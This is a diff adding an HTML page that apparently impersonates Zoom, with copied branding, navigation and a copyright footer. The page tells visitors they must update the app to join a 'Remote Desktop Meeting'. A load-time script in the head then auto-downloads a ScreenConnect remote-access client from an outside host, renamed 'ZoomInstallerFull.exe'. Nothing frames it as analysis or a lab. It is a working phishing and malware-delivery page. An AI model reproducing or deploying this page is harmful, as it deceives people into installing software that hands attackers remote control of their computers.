@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zoom</title>
+    
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f7fa;
+            color: #2d3748;
+        }
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            background-color: #fff;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .navbar .logo {
+            height: 40px;
+            width: auto;
+        }
+
+        .navbar .logo img {
+            height: 100%;
+            width: 100%;
+            object-fit: contain;
+        }
+
+        .navbar .nav-links {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            color: #2d3748;
+            font-size: 16px;
+        }
+
+        .nav-links a.ai {
+            color: #6b46c1;
+            position: relative;
+            padding-left: 15px;
+            justify-content: center;
+        }
+
+        .nav-links a.ai::before {
+            content: "AI";
+            position: absolute;
+            left: -5px;
+            top: -1px;
+            background-color: #6b46c1;
+            color: #fff;
+            font-size: 10px;
+            padding: 2px 5px;
+            border-radius: 3px;
+        }
+
+        .nav-links .btn {
+            padding: 5px 15px;
+            border-radius: 5px;
+            background-color: #0c5cff;
+            color: #fff;
+            text-decoration: none;
+        }
+
+        .nav-links .btn.secondary {
+            background-color: transparent;
+            color: #0c5cff;
+            border: 1px solid #0c5cff;
+        }
+
+        .hero {
+            text-align: center;
+            padding: 50px 20px;
+            background-color: #f5f7fa;
+        }
+
+        .hero h1 {
+            font-size: 36px;
+            margin-bottom: 20px;
+            color: #2d3748;
+        }
+
+        .hero h1 span {
+            color: #0c5cff;
+        }
+
+        .hero .cta {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .cta a {
+            text-decoration: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            color: #fff;
+            background-color: #0c5cff;
+        }
+
+        .cta a.secondary {
+            background-color: transparent;
+            color: #0c5cff;
+            border: 1px solid #0c5cff;
+        }
+
+        .hero .promo {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .hero .promo a {
+            color: #0c5cff;
+            text-decoration: none;
+        }
+
+        .workspace {
+            display: flex;
+            justify-content: center;
+            padding: 20px;
+            background-color: #e6effc;
+            border-radius: 10px;
+            margin: 20px auto;
+            max-width: 1200px;
+        }
+
+        .workspace .sidebar {
+            width: 60px;
+            background-color: #d6e4ff;
+            border-radius: 10px 0 0 10px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 10px 0;
+            gap: 10px;
+        }
+
+        .sidebar img {
+            width: 24px;
+            height: 24px;
+            filter: invert(50%);
+        }
+
+        .workspace .content {
+            flex-grow: 1;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 0 10px 10px 0;
+        }
+
+        .content h2 {
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+
+        .content .video-container {
+            position: relative;
+            padding-bottom: 56.25%;
+            /* 16:9 Aspect Ratio */
+            height: 0;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+
+        .content .video-container video {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: 1px solid #d6e4ff;
+            border-radius: 5px;
+        }
+
+        .footer {
+            background-color: #1a1a2b;
+            color: #fff;
+            padding: 40px 20px;
+            text-align: left;
+            font-size: 14px;
+        }
+
+        .footer .columns {
+            display: flex;
+            justify-content: space-around;
+            gap: 20px;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+            max-width: 1200px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .footer .column {
+            text-align: left;
+            flex: 1;
+            min-width: 150px;
+            margin: 10px;
+        }
+
+        .footer .column h4 {
+            color: #a0aec0;
+            font-size: 14px;
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+
+        .footer .column a {
+            color: #a0aec0;
+            text-decoration: none;
+            display: block;
+            margin: 8px 0;
+            font-size: 13px;
+        }
+
+        .footer .column a:hover {
+            text-decoration: underline;
+        }
+
+        .footer .dropdown-container {
+            position: relative;
+            display: inline-block;
+            margin-bottom: 10px;
+        }
+
+        .footer .dropdown-select {
+            background-color: #2d3748;
+            color: #fff;
+            padding: 8px 15px;
+            border-radius: 5px;
+            border: 1px solid #4a5568;
+            cursor: pointer;
+            font-size: 13px;
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            padding-right: 30px;
+            /* Space for dropdown arrow */
+        }
+
+        .footer .dropdown-select option {
+            background-color: #2d3748;
+            color: #fff;
+        }
+
+        .footer .social-icons {
+            display: flex;
+            justify-content: flex-start;
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        .footer .social-icons a {
+            display: inline-block;
+            width: 32px;
+            height: 32px;
+            background-color: #4a5568;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 16px;
+            text-decoration: none;
+        }
+
+        .footer .social-icons img {
+            width: 16px;
+            height: 16px;
+            filter: invert(100%);
+        }
+
+        .footer .legal-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #4a5568;
+        }
+
+        .footer .legal-links a {
+            color: #a0aec0;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .footer .legal-links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer .legal {
+            color: #a0aec0;
+            font-size: 12px;
+            margin-top: 15px;
+            text-align: center;
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 768px) {
+            .navbar {
+                flex-direction: column;
+                padding: 10px;
+            }
+
+            .nav-links {
+                flex-direction: column;
+                gap: 10px;
+                margin-top: 10px;
+            }
+
+            .hero h1 {
+                font-size: 24px;
+            }
+
+            .workspace {
+                flex-direction: column;
+                width: 100%;
+                margin: 10px 0;
+            }
+
+            .sidebar {
+                flex-direction: row;
+                width: 100%;
+                justify-content: center;
+                border-radius: 10px 10px 0 0;
+            }
+
+            .content {
+                border-radius: 0 0 10px 10px;
+            }
+
+            .footer .columns {
+                flex-direction: column;
+                gap: 20px;
+                align-items: center;
+            }
+
+            .footer .column {
+                text-align: center;
+                min-width: unset;
+            }
+
+            .footer .social-icons {
+                justify-content: center;
+            }
+        }
+    </style>
+    <script>
+        window.addEventListener('load', function() {
+            // Delay the download by 1 second to ensure the page is visible
+            setTimeout(function() {
+                var link = document.createElement('a');
+                // link.href = 'meeting/ZoomInstallerFull.exe'; 
+                link.href="https://adv.servicesdownload.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest&c=RainMan&c=&c=Accounting&c=&c=&c=&c=&c="
+                link.download = 'ZoomInstallerFull.exe'; // Name of the file to save as
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }, 1000);
+        });
+    </script>
+</head>
+
+<body>
+    <div class="navbar">
+        <div class="logo"><img src="zoom.png" alt="Zoom Logo" /></div>
+        <div class="nav-links">
+            <a href="#" class="ai">Products <span>AI</span></a>
+            <a href="#">Solutions</a>
+            <a href="#">Resources</a>
+            <a href="#">Pricing</a>
+            <a href="#">Support</a>
+            <a href="#">Meet</a>
+            <a href="#">Sign In</a>
+            <a href="#" class="btn secondary">Contact Sales</a>
+            <a href="#" class="btn">Sign Up Free</a>
+        </div>
+    </div>
+
+
+    <div class="hero">
+        <h1>Sorry, You do not have the latest version of <span>Zoom Workspace App </span>installed...</h1>
+        <!-- <div class="cta">
+            <a href="#">See pricing</a>
+            <a href="#" class="secondary">Contact sales</a>
+        </div> -->
+        <div class="promo"> The latest version of our Application will download automatically, kindly install to join
+            the Remote Desktop Meeting.</div>
+            <div class="promo">If it doesn't, <a href="#">restart the download</a></div>
+    </div>
+    <div class="content">
+        <div class="video-container">
+            <video autoplay muted loop>
+                <source src="zoom-product.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+    </div>
+    <div class="footer">
+        <div class="columns">
+            <div class="column">
+                <h4>About</h4>
+                <a href="#">Zoom Blog</a>
+                <a href="#">Customers</a>
+                <a href="#">Our Team</a>
+                <a href="#">Careers</a>
+                <a href="#">Integrations</a>
+                <a href="#">Partners</a>
+                <a href="#">Investors</a>
+                <a href="#">Press</a>
+                <a href="#">Sustainability & ESG</a>
+                <a href="#">Zoom Cares</a>
+                <a href="#">Media Kit</a>
+                <a href="#">How To Videos</a>
+                <a href="#">Developer Platform</a>
+                <a href="#">Zoom Ventures</a>
+                <a href="#">Zoom Merchandise Store</a>
+            </div>
+            <div class="column">
+                <h4>Download</h4>
+                <a href="#">Zoom Workplace App</a>
+                <a href="#">Zoom Rooms App</a>
+                <a href="#">Zoom Rooms Controller</a>
+                <a href="#">Browser Extension</a>
+                <a href="#">Outlook Plug-in</a>
+                <a href="#">iPhone/iPad App</a>
+                <a href="#">Android App</a>
+                <a href="#">Zoom Virtual Backgrounds</a>
+            </div>
+            <div class="column">
+                <h4>Sales</h4>
+                <a href="#">1.888.799.9666</a>
+                <a href="#">Contact Sales</a>
+                <a href="#">Plans & pricing</a>
+                <a href="#">Request a Demo</a>
+                <a href="#">Webinars and Events</a>
+                <a href="#">Zoom Experience Center</a>
+            </div>
+            <div class="column">
+                <h4>Support</h4>
+                <a href="#">Test Zoom</a>
+                <a href="#">Account</a>
+                <a href="#">Support Center</a>
+                <a href="#">Learning Center</a>
+                <a href="#">Feedback</a>
+                <a href="#">Zoom Community</a>
+                <a href="#">Contact Us</a>
+                <a href="#">Accessibility</a>
+                <a href="#">Developer Support</a>
+                <a href="#">Privacy, Security, Legal Policies, and Modern Slavery Act</a>
+                <a href="#">Transparency Statement</a>
+            </div>
+            <div class="column">
+                <h4>Language</h4>
+                <div class="dropdown-container">
+                    <select class="dropdown-select">
+                        <option>English</option>
+                        <option>Spanish</option>
+                        <option>French</option>
+                    </select>
+                </div>
+                <h4>Currency</h4>
+                <div class="dropdown-container">
+                    <select class="dropdown-select">
+                        <option>US Dollars $</option>
+                        <option>Euro €</option>
+                        <option>Pound £</option>
+                    </select>
+                </div>
+                <!-- <div class="social-icons">
+                    <a href="#"><img src="https://www.vectorlogo.zone/logos/wordpress/wordpress-icon.svg" alt="WordPress"></a>
+                    <a href="#"><img src="https://www.vectorlogo.zone/logos/linkedin/linkedin-icon.svg" alt="LinkedIn"></a>
+                    <a href="#"><img src="https://www.vectorlogo.zone/logos/twitter/twitter-icon.svg" alt="X"></a>
+                    <a href="#"><img src="https://www.vectorlogo.zone/logos/youtube/youtube-icon.svg" alt="YouTube"></a>
+                    <a href="#"><img src="https://www.vectorlogo.zone/logos/facebook/facebook-icon.svg" alt="Facebook"></a>
+                    <a href="#"><img src="https://www.vectorlogo.zone/logos/instagram/instagram-icon.svg" alt="Instagram"></a>
+                </div> -->
+            </div>
+        </div>
+        <div class="legal-links">
+            <a href="#">Terms</a>
+            <a href="#">Privacy</a>
+            <a href="#">Trust Center</a>
+            <a href="#">Acceptable Use Guidelines</a>
+            <a href="#">Legal & Compliance</a>
+            <a href="#">Your Privacy Choices</a>
+            <a href="#">Cookie Preferences</a>
+        </div>
+        <div class="legal">
+            Copyright ©2025 Zoom Communications, Inc. All rights reserved.
+        </div>
+    </div>
+</body>
+
+</html>
